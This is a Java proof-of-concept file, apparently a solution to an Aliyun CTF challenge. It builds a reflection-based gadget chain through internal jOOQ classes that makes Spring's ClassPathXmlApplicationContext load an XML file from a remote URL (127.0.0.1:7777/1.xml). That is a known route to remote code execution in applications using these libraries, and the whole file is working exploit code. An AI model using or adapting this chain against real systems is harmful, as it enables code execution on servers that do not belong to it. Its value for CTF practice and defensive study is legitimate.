package com.aliyunctf.server.solution;

import org.jooq.DataType;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.ProxyFactory;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Poc {
    public static void main(String[] args) throws Exception {
//        String xml = "http://127.0.0.1:7777/1.xml";
//        Class<?> aClass = Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext");
//        Class<?> all = Class.forName("org.jooq.impl.Convert$ConvertAll");
//        Object convertAll = all.getDeclaredConstructor(Class.class).newInstance(aClass);

        Class clazz1 = Class.forName("org.jooq.impl.Dual");
        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];
        constructor1.setAccessible(true);
        Object table = constructor1.newInstance();

        Class clazz2 = Class.forName("org.jooq.impl.TableDataType");
        Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
        constructor2.setAccessible(true);
        Object tableDataType = constructor2.newInstance(table);

        Class clazz3 = Class.forName("org.jooq.impl.Val");
        Constructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);
        constructor3.setAccessible(true);
        Object val = constructor3.newInstance("whatever", tableDataType, false);

        Class clazz4 = Class.forName("org.jooq.impl.ConvertedVal");
        Constructor constructor4 = clazz4.getDeclaredConstructors()[0];
        constructor4.setAccessible(true);
        Object convertedVal = constructor4.newInstance(val, tableDataType);

        Object value = "http://127.0.0.1:7777/1.xml";
        Class type = ClassPathXmlApplicationContext.class;

        Tools17.setFieldValue(val, "value", value);
        Tools17.setFieldValue(tableDataType, "uType", type);

        Method m = convertedVal.getClass().getMethod("getValue");
        m.setAccessible(true);
        m.invoke(convertedVal);



    }
}
